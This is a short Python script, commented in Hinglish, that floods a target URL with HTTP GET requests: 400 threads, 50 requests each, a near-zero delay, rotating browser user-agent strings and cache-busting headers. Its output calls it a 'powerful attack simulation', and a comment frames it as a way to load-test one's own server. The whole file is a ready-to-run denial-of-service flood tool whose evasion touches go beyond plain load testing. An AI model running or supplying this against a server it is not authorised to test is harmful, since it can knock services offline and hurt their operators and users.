import threading
import requests
import time
import random

TARGET_URL = "http://yourserver.com"  # Apne server ka URL/IP daalo
THREADS = 400                     # Zyada threads for more load
REQUESTS_PER_THREAD = 50          # Zyada requests per thread
DELAY_BETWEEN_REQUESTS = 0.01     # Kam delay, matlab fast requests

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

def send_requests(thread_id):
    success_count = 0
    for i in range(REQUESTS_PER_THREAD):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        try:
            resp = requests.get(TARGET_URL, headers=headers, timeout=5)
            if resp.status_code == 200:
                success_count += 1
            print(f"Thread-{thread_id} Req-{i+1}: Status {resp.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Thread-{thread_id} Req-{i+1}: Failed - {e}")
        time.sleep(DELAY_BETWEEN_REQUESTS)
    print(f"Thread-{thread_id} done, successful: {success_count}")

def main():
    print(f"Starting powerful attack simulation on {TARGET_URL} with {THREADS} threads...")
    threads = []
    start_time = time.time()

    for t_id in range(THREADS):
        t = threading.Thread(target=send_requests, args=(t_id,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"Powerful attack simulation completed in {time.time() - start_time:.2f} seconds.")

if __name__ == "__main__":
    main()
    
